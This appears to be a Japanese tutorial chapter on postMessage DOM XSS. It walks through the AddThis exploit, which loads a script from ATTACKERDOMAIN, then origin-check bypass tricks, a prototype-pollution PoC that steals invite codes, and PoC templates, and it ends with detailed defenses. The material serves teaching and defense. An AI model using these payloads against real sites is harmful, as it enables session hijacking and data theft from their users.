さらにリスナーは、受け取ったメッセージが `at-share-bookmarklet:DATA` という形式であることを期待しており、`DATA` の部分を使って**外部からスクリプトファイルを読み込む**動作をしました（AddThisのブックマークレット共有機能に由来する挙動）。オリジンが実質ノーチェックなので、この `DATA` に攻撃者のスクリプトURLを入れれば、被害ページがそれをロードして実行してしまいます。

#### エクスプロイト

再構成された攻撃の骨子は次の通りです。

```html
<!-- attacker.com: AddThisを読み込む任意の被害ページを frame に入れて postMessage -->
<iframe id="frame" src="https://victim.com/page-that-uses-addthis"></iframe>
<script>
  // ページロード後、AddThisのリスナー宛てにブックマークレット形式のメッセージを送る
  setTimeout(function () {
    document.getElementById('frame').contentWindow.postMessage(
      'at-share-bookmarklet://ATTACKERDOMAIN/xss.js',  // DATA = 攻撃者のスクリプトURL
      '*'
    );
  }, 3000);
</script>
```

**なぜ動くのか**: 被害ページ内で動いているAddThisのリスナーは、`event.origin` がHTTP(S)でありさえすれば受理します（攻撃者ページもHTTPSなので通過）。受理したメッセージが `at-share-bookmarklet:` で始まると、AddThisはその後続部分 `//ATTACKERDOMAIN/xss.js` を「読み込むべきスクリプトの場所」として解釈し、`xss.js` を被害ページのコンテキストで読み込み・実行します。結果として、攻撃者の任意JavaScriptが `victim.com` のオリジン権限で走り、Cookieの窃取・セッション乗っ取り・ページ改竄など何でもできてしまいます。1つの第三者スクリプトの検証漏れが、それを貼っている100万サイト全てのXSSに直結した、というのがこの事例の核心です。

#### 修正と教訓

修正は単純で、**未知のオリジンからのメッセージを弾く、まっとうなオリジン検証（許可リスト）を追加する**というものでした。AddThisのCTOに報告され、パッチは速やかに開発・配信されました。

Karlssonがこの記事で繰り返し強調する結論はこうです。**「第三者スクリプトを使うなら、そのスクリプト自身とその `postMessage` 実装を必ず精査せよ」。** 自社コードがどれだけ堅牢でも、貼り付けた広告・解析・シェアボタンのウィジェットが穴だらけなら、あなたのサイトのユーザーはそのまま危険にさらされます。攻撃対象を探すバグハンター視点で言えば、「広く使われている埋め込みウィジェットの `postMessage` リスナー」は、1つ落とせば大量のサイトに効く、費用対効果が極めて高いターゲットだということです。

> 出典: postMessage XSS on a million sites（Detectify Labs, Mathias Karlsson, 2016-12-15） — https://labs.detectify.com/writeups/postmessage-xss-on-a-million-sites/

---

### オリジン検証バイパス — 「一応チェックしている」を破る原理

多くの実装は `event.origin` を全く見ないわけではなく、「見てはいるが甘い」ことが問題です。ここが本節で最も原理的に面白い部分で、**JavaScriptの文字列メソッドや正規表現の仕様、ブラウザのオリジン割り当ての挙動**を突いてバイパスします。攻撃者がやるべきことは常に一つ、「そのチェックを**通ってしまう**オリジンを、自分が支配下に置ける形で用意する」ことです。

#### 1. `indexOf()` / 部分文字列マッチの罠

```javascript
// 脆弱: 「trustedドメインを含んでいればOK」という部分一致
window.addEventListener("message", (e) => {
  if (e.origin.indexOf("trusted.com") === -1) return;  // または !== 0
  document.body.innerHTML = e.data;
});
```

`String.prototype.indexOf` は「部分文字列がどこかに含まれるか」を返すだけです。したがって攻撃者は、**許可文字列を部分文字列として含むオリジン**を用意すれば通過できます。

- `indexOf("trusted.com") !== -1`（どこかに含まれればOK）の場合 → `https://trusted.com.attacker.com` や `https://attacker.com/?trusted.com` のようなドメイン/URLで通過。前者は `trusted.com` を接頭辞に持つ攻撃者管理ドメインです。
- `indexOf("https://app.marketo.com") === 0`（＝先頭一致 `startsWith` 相当）の場合でも、HackTricksが挙げる有名な例のように、`"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")` は `0` を返します。つまり `https://app-sj17.ma`（`.ma` はモロッコのTLD）という**実在しうる短いドメインで先頭一致を満たせる**わけです。

**なぜ動くのか**: `indexOf` はオリジンを「意味のある境界（ドット区切りのラベル）」として扱わず、ただのバイト列として部分一致を見るだけだからです。ドメインは右から左に階層が決まる（`a.b.com` の所有権は `b.com` の持ち主に属する）のに、部分文字列マッチはその構造を完全に無視します。

#### 2. 正規表現の落とし穴（`search()` と未エスケープのドット）

```javascript
// 脆弱: search() に「文字列」を渡している
if ("https://www.trusted.com".search(userOriginPattern) ) { ... }
// あるいは自前の正規表現でドットをエスケープしていない
const re = /^https:\/\/www.trusted.com$/;   // '.' が未エスケープ
if (re.test(e.origin)) { ... }
```

二つの別々のバグが同じ原理に帰着します。

- **`String.prototype.search()` は引数を正規表現として解釈します。** 文字列を渡しても暗黙に `RegExp` へ変換されるため、`.` などの正規表現メタ文字がそのまま特別扱いになります。HackTricksの例では `"https://www.safedomain.com".search("www.s.fedomain.com")` がマッチしてしまいます。
- **正規表現内の `.` は「任意の1文字」にマッチするワイルドカード**です。`/^https:\/\/www.trusted.com$/` は開発者の意図では `www.trusted.com` を表すつもりでも、実際には `www` の後の `.` が任意文字にマッチするため、`https://wwwXtrusted.com` のようなドメインでも通ります（`X` は任意の1文字）。攻撃者は `wwwatrusted.com` のような**別ドメインを取得**すれば検証を突破できます。同様に、末尾を `$` で固定していない `/^https:\/\/trusted\.com/` は `https://trusted.com.attacker.com` を許してしまいます。

**なぜ動くのか**: ドメイン名の照合を「正規表現の文字クラスとして」書いてしまうと、ドメインの区切り文字であるはずの `.` が、正規表現の世界では「なんでもいい1文字」という真逆の意味を持つからです。名前空間（ドメイン階層）の意味論と、正規表現のパターンマッチの意味論が食い違うところに穴が生まれます。

#### 3. `startsWith` / `endsWith` の誤用

```javascript
if (e.origin.startsWith("https://trusted.com")) { ... }  // → https://trusted.com.evil.com が通る
if (e.origin.endsWith("trusted.com")) { ... }            // → https://nottrusted.com が通る
```

**なぜ動くのか**: `startsWith` は右側に何が続いても許すのでサブドメイン偽装（`trusted.com.evil.com`）を許し、`endsWith` は左側に何が付いても許すので接頭辞偽装（`nottrusted.com`、`eviltrusted.com`）を許します。ドメインの所有権境界（ラベル境界の `.`）を見ないチェックは、方向を問わず必ず破れます。正しくは「**完全一致**」か「厳密なラベル境界を考慮した許可リスト照合」でなければなりません。

#### 4. `null` オリジン — サンドボックス化iframeの悪用

`event.origin` が信頼される正規の値そのものと一致するかを見る実装、特に `e.origin === window.origin`（＝「自分自身と同じオリジンからのメッセージか」）という比較にも抜け道があります。

```html
<iframe sandbox="allow-scripts allow-popups" src="https://victim.example/iframe.php"></iframe>
```

**なぜ動くのか**: `sandbox` 属性付きのiframeは、`allow-same-origin` を付けない限り**オリジンが `null` になります**。さらに `allow-popups-to-escape-sandbox` が無い状態でそのサンドボックス内から `window.open` でポップアップを開くと、ポップアップもサンドボックスと `null` オリジンを継承します。すると、そのポップアップ内で動くページから見た `window.origin` は `"null"`、送ってくるメッセージの `e.origin` も `"null"` になり、`e.origin === window.origin`（`"null" === "null"`）が**成立してしまいます**。攻撃者はこの `null` 同士の一致を使って「同一オリジン限定」のつもりの検証をすり抜けます。

#### 5. `e.source` チェックの `null` 化

一部の実装は「送ってきた窓が、自分が知っている窓（例: 自分が開いたiframe）と同一か」を `e.source` で確認します。

```javascript
if (e.source !== myIframe.contentWindow) return;  // 送信元ウィンドウの同一性チェック
```

これも回避可能です。**postMessageを送った直後に、送信元のiframeをDOMから削除する**と、受信側が `message` イベントを処理する頃には送信元ウィンドウが破棄され、`e.source` が `null` になります。攻撃者は比較対象の期待値も `null` になるよう仕向けたり、単に `e.source` ベースの分岐を無効化したりできます。

**なぜ動くのか**: `e.source` はライブなウィンドウ参照であり、そのウィンドウ（iframe）が消滅すると参照は `null` に落ちます。イベントの発火と処理の間にわずかな時間差があることを突いた、レースコンディション的なトリックです。

#### 6. サニタイズ関数（`escapeHtml`）自体のバイパス

「`event.data` を innerHTML に入れる前に自前の `escapeHtml` でエスケープしているから安全」という実装すら、関数の作りによっては破れます。HackTricmのミラーが挙げる例では次のようになります。

```javascript
// 期待どおり動くケース（プレーンオブジェクト）
result = u({message: "'\"<b>\\"});
result.message // => "&#39;&quot;&lt;b&gt;\"   （エスケープされる）

// バイパス（File や Error オブジェクトを渡す）
result = u(new Error("'\"<b>\\"));
result.message; // => "'"<b>\"                 （エスケープされない！）
```

**なぜ動くのか**: この種のエスケープ関数は、オブジェクトの各プロパティに対して `hasOwnProperty`（自分自身が直接持つプロパティかどうかの判定）でフィルタしてからエスケープする作りになっていることがあります。`File` や `Error` のようなビルトインオブジェクトの `message` は、その判定に期待どおり応答しない（プロトタイプ側のアクセサ経由であるなど）ため、**エスケープ処理のループから漏れて生の値が残ります**。攻撃者は「サニタイズ関数が想定していない型のオブジェクト」を `event.data` として送り込むことで、エスケープをすり抜けたペイロードをsinkへ届けます。

> なお、サニタイザのバイパスはライブラリのバージョンに強く依存します。たとえば著名なHTMLサニタイザ **DOMPurify** は、mutation XSS（mXSS。ブラウザがHTMLを再パースする際に文字列が別の意味の要素へ「変異」して解釈され、サニタイズをすり抜ける攻撃）を突く複数のバイパスが過去に報告され、**2.0.17 など特定バージョンで順次修正**されてきました。`event.data` をサニタイズしてからsinkに渡す設計を評価する際は、**どのサニタイザの、どのバージョンを使っているか**を必ず確認してください。古いバージョンには公開済みの回避手法が存在し得ます（陳腐化への注意: 個々のバイパスは修正されるため、常に対象バージョンと公開年をセットで捉えること）。

> 出典: postMessage脆弱性の高度な連鎖（Intigriti） — https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-postmessage-vulnerabilities
> 出典: PostMessage Vulnerabilities（HackTricks、上記Intigriti記事に対応するミラー的資料。indexOf/search/null origin/e.source/escapeHtml バイパスの各コード例の出所） — https://hacktricks.wiki/en/pentesting-web/postmessage-vulnerabilities/index.html

---

### 高度な連鎖 — postMessage × プロトタイプ汚染 × CSP

上級者向けの実戦では、postMessageは「単独でXSSに至らないとき」に他の脆弱性クラスと連鎖させます。Intigritiの記事（およびそのミラー）が示す代表的な2パターンを解説します。

#### プロトタイプ汚染からのXSS

**プロトタイプ汚染（Prototype Pollution）** とは、JavaScriptの全オブジェクトが共有する大元のプロトタイプ（`Object.prototype`）を、`__proto__` というキーを通じて攻撃者が書き換えてしまう脆弱性です。JavaScriptでオブジェクトのプロパティを参照すると、そのオブジェクト自身に無ければ**プロトタイプチェーンを上へ辿って**探しにいきます。したがって `Object.prototype` に細工したプロパティを仕込むと、**アプリ内のあらゆるオブジェクトがそのプロパティを「持っているかのように」振る舞い**、後続の描画ロジックがそれを読み出してsinkに流すとXSSになります。

postMessageは、この汚染を注入する経路になり得ます。受信側が `event.data` を `JSON.parse` して既存オブジェクトへ再帰的にマージするような実装だと、`__proto__` 入りのJSONを送るだけで汚染できます。

```html
<html>
<body>
    <iframe id="idframe" src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
    <script>
        function get_code() {
            document.getElementById('idframe').contentWindow.postMessage(
                '{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(r=>r.json()).then(d=>{alert(d[\'result\'][0][\'code\']);})\\" />"}}}',
                '*'
            );
            document.getElementById('idframe').contentWindow.postMessage(JSON.stringify("refresh"), '*');
        }
        setTimeout(get_code, 2000);
    </script>
</body>
</html>
```

**なぜ動くのか**: 1通目のメッセージで `{"__proto__":{"editedbymod":{"username":"<img ... onerror=...>"}}}` を送ると、受信側の再帰マージが `Object.prototype.editedbymod.username` に攻撃者のHTMLペイロードを書き込みます（プロトタイプ汚染）。以後、アプリ内のどのオブジェクトでも `obj.editedbymod.username` を読むとこのペイロードが返ります。2通目の `"refresh"` でアプリに再描画を促すと、描画ロジックが汚染された `username` を読み出して innerHTML 系のsinkに差し込み、`<img onerror>` が発火。ここでは `same-origin` のfetchで招待コード（invitecodes）APIを叩き、結果を `alert` に出す——という情報窃取まで一気に連鎖しています。postMessageが「汚染の注入口」、プロトタイプ汚染が「ペイロードの潜伏場所」、再描画が「sinkへの着火」という三段構えです。

#### CSPの `unsafe-eval` を利用した実行

**CSP（Content Security Policy。ページが読み込む/実行するリソースの出所をブラウザに制限させるヘッダベースの防御）** が効いていると、単純な `<script>` 注入は止められることがあります。しかしCSPに `script-src 'unsafe-eval'` が含まれていると、`eval()` や `Function()` による文字列→コード実行が許可されたままになります。Intigritiが示すCTF系の例では、正しいpostMessageチャネル経由で送ったコードが、`unsafe-eval` が有効なために `eval` 相当の処理で自動評価され、XSSが成立しました。

**なぜ動くのか**: CSPはソース許可リスト（どのオリジンのスクリプトを、どういう方法で実行してよいか）を上から評価しますが、`'unsafe-eval'` はそのリストに「文字列からのコード生成を許す」という抜け穴を明示的に開けてしまいます。postMessageのsinkが `eval(event.data)` 系であれば、CSPがあっても `'unsafe-eval'` の存在ゆえに素通しになります。CSPを回避するのではなく、**CSPの設定不備そのものを利用する**連鎖です。

> 出典: postMessage脆弱性の高度な連鎖（Intigriti） — https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-postmessage-vulnerabilities
> 出典: PostMessage Vulnerabilities（HackTricks、プロトタイプ汚染PoCコードの出所） — https://hacktricks.wiki/en/pentesting-web/postmessage-vulnerabilities/index.html

---

### 発見のワークフロー — ハンティングの実務

postMessage脆弱性を実地で探す手順を、Intigriti/HackTrick系資料に基づいて整理します。

#### 1. メッセージリスナーを列挙する

対象ページを開き、ブラウザの開発者ツールのコンソールで次を実行します（Chrome系の場合）。

```javascript
getEventListeners(window)
```

`message` のエントリがあれば、その `listener` 関数のソースを展開して中身を読みます。GUIからは「Elements → 対象要素/window → Event Listeners タブ」でも確認できます。ソースコード（バンドルされたJS）に対しては、次のキーワードで grep します。

```
addEventListener("message"    /  addEventListener('message'
onmessage =
$(window).on("message"        （jQuery 経由）
```

#### 2. ハンドラを静的解析する（3つの問い）

見つけた `message` ハンドラごとに、次を確認します。

1. **オリジン検証はあるか、そして厳密か？** `event.origin` を一切見ていない／`indexOf`・`search`・`startsWith`・`endsWith`・未エスケープの正規表現で見ている、なら要注意（前節の各バイパスが適用できる）。
2. **`event.data` はどのsinkに到達するか？** `innerHTML`、`outerHTML`、`document.write`、`eval`/`Function`/`setTimeout(str)`、`location`/`location.href`、`element.src`（script/iframe）、`jQuery(...)`、`postMessage` の再送、`JSON.parse` 後の再帰マージ（プロトタイプ汚染）などへ流れていないか。
3. **データの「形」の検証はあるか？** 型・キー名・値の範囲チェックが無ければ、攻撃者は自由な `event.data` を送れる。

#### 3. PoCを組み立てる

対象ページがiframe埋め込みを禁止しているか（`X-Frame-Options` や CSP `frame-ancestors`）で手法を選びます。

- **iframe可の場合**: `<iframe src="victim" onload="this.contentWindow.postMessage(PAYLOAD,'*')">`
- **iframe不可（X-Frame-Options等あり）の場合**: `window.open` で新規タブに開く。

```html
<script>
  var w = window.open("https://victim.com/target");
  setTimeout(function () { w.postMessage(PAYLOAD, '*'); }, 2000);
</script>
```

**なぜ `window.open` で回避できるのか**: `X-Frame-Options` / `frame-ancestors` は「他サイトにiframeとして**埋め込まれる**こと」だけを防ぐ指定であり、`window.open` による**トップレベルの別窓表示**は妨げません。postMessageはトップレベル窓に対しても送れるため、埋め込み制限があってもハンドラは叩けます。

#### 4. 補助ツール

- **posta**（`benso-io/posta`）: ページ内の全postMessage通信を傍受・可視化し、リスナーの列挙やメッセージの再送（リプレイ）を支援。
- **postMessage-tracker**（`fransr/postMessage-tracker`）: 送受信されるメッセージと、それを処理するリスナーのスタックトレースを追跡するブラウザ拡張。

これらを使うと「どんなメッセージが、どのリスナーに、どう処理されているか」を実行時に観測でき、静的解析だけでは見落とすsinkへの経路を発見しやすくなります。

> 出典: postMessage脆弱性の高度な連鎖（Intigriti、発見手法・PoC構成） — https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-postmessage-vulnerabilities
> 出典: PostMessage Vulnerabilities（HackTricks、getEventListeners / posta / postMessage-tracker / window.open 回避の出所） — https://hacktricks.wiki/en/pentesting-web/postmessage-vulnerabilities/index.html

---

### 防御策 — 正しい postMessage の書き方

最後に、これまでのバイパス手法を踏まえて「破れない」実装原則をまとめます。ポイントは**受信側・送信側の両方**を固めることです。

#### 受信側（最重要）

1. **オリジンは必ず「完全一致」で許可リスト照合する。** `indexOf`・`search`・`startsWith`・`endsWith`・正規表現による部分/曖昧一致は使わない。どうしても複数オリジンを許すなら、正規化した文字列の**完全一致の集合**で判定する。

   ```javascript
   const ALLOWED = new Set(["https://trusted.example.com", "https://widget.example.com"]);
   window.addEventListener("message", (event) => {
     if (!ALLOWED.has(event.origin)) return;   // 完全一致のみ
     // ...
   });
   ```

   **なぜこれで安全か**: `Set.has` はオリジン文字列の完全一致だけを真とするため、部分文字列偽装・サブドメイン偽装・正規表現ワイルドカードのいずれも成立しません。ドメインの所有権境界を文字列全体で判定していることになります。

2. **`event.data` の「形」を検証する。** 期待する型・キー・値域を明示的にチェックし、想定外のオブジェクト（`File`/`Error` など）や余分なキー（`__proto__` など）を拒否する。JSONをパースする場合は、再帰マージで `__proto__`/`constructor`/`prototype` を無視する安全なマージ関数を使う（プロトタイプ汚染対策）。

3. **危険なsinkを使わない。** `innerHTML`/`document.write`/`eval`/`Function`/`setTimeout(文字列)`/`location=` に `event.data` を直接渡さない。テキスト表示なら `textContent`、DOM生成なら安全なAPI（`createElement` + 属性の個別設定）を使う。サニタイズが必要なら**最新の**専用ライブラリ（DOMPurifyの最新版など）を用い、自前の `escapeHtml` に頼らない。

#### 送信側

4. **`targetOrigin` にワイルドカード `'*'` を使わない。** 送り先が確定しているなら、必ず具体的オリジンを書く。これにより、配達先窓のオリジンが攻撃者に差し替えられていても、意図しないオリジンへは配達されず、機密データの漏洩を防げる。

   ```javascript
   childWindow.postMessage(payload, "https://trusted.example.com");  // '*' にしない
   ```

#### 多層防御（フレーム/CSP）

5. **クリックジャッキング/埋め込み対策も併用する。** `X-Frame-Options: DENY`（または `SAMEORIGIN`）と CSP の `frame-ancestors` で、意図しないサイトからの埋め込みを禁止する。ただしこれは `window.open` 経由の攻撃までは防げないため、あくまで受信側の厳密なオリジン検証と組み合わせる補助策と位置づける。
6. **CSPを適切に絞る。** `script-src` から `'unsafe-eval'` と `'unsafe-inline'` を排除し、万一sinkにデータが届いても実行されにくくする。CSPは最後の安全網であって、オリジン検証の代わりにはならない。

要するに、postMessage防御の一丁目一番地は **「受信側で送信元オリジンを完全一致の許可リストで検証し、`event.data` の形を検証し、危険なsinkを避ける」** の三点セットであり、送信側の `targetOrigin` 明示とCSP/フレーム制限がそれを補強します。AddThisの事例が示したのは、この三点のうち最初の一点（厳密なオリジン検証）を怠っただけで、100万サイトが一斉にXSSへ転落したという事実です。

> 出典: postMessage脆弱性入門（YesWeHack、防御策とベストプラクティス） — https://www.yeswehack.com/learn-bug-bounty/introduction-postmessage-vulnerabilities
> 出典: postMessage XSS on a million sites（Detectify Labs、第三者スクリプト精査の教訓） — https://labs.detectify.com/writeups/postmessage-xss-on-a-million-sites/
> 出典: postMessage脆弱性の高度な連鎖（Intigriti、防御の総合） — https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-postmessage-vulnerabilities

---

### この節のまとめ

- `postMessage` はSOPの壁を越えて安全に通信するためのAPIだが、**受信側が `event.origin` を検証しない／甘く検証する**と、攻撃者が任意の `event.data`（taint source）をsinkへ流し込めてDOM XSSになる。
- 送信側の `targetOrigin='*'` は情報漏洩を、受信側のsink（`innerHTML`/`eval`/`document.write`/`location`）への無防備な代入はコード実行を招く。
- **AddThis事例（2016, 100万サイト）** は、オリジン検証を「HTTP/HTTPSであること」だけに省略した結果、`at-share-bookmarklet://ATTACKERDOMAIN/xss.js` 一撃で全サイトがXSS可能になった、第三者スクリプトの怖さの象徴。
- オリジン検証バイパスは、`indexOf`の部分一致、`search()`/正規表現の `.` ワイルドカード、`startsWith`/`endsWith` の境界無視、サンドボックスiframeの `null` オリジン、iframe削除による `e.source` の `null` 化、`File`/`Error` を使った `escapeHtml` 回避——いずれも**言語仕様やブラウザ挙動の意味論のズレ**を突いている。
- 高度な実戦では、**プロトタイプ汚染（`__proto__` 注入）** や **CSPの `unsafe-eval`** と連鎖してXSSに到達する。
- 防御の核心は「**受信側で完全一致の許可リストによるオリジン検証＋データ形式検証＋危険なsink回避**」。サニタイザに頼る場合はバージョン依存の回避手法に注意する。

---

（前章: [第2章 コンテキストとペイロード](./02-context-payloads.md)　｜　次章: [第4章 高度なXSS](./04-advanced.md)　｜　[目次](./README.md)）
